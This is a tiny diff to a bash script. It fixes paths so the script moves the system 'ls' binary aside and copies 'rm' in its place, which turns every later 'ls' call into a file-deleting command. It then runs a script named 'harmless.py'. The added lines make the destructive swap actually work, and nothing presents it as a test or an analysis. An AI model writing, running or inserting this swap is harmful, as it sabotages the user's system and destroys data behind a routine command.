@@ -1,6 +1,6 @@
 #!/bin/bash
-mv /etc/bin/ls ~/Documents
-cp /etc/bin/rm /etc/bin/ls
+mv /usr/bin/ls ~/Documents
+cp /usr/bin/rm /usr/bin/ls
 python3 harmless.py
 
 
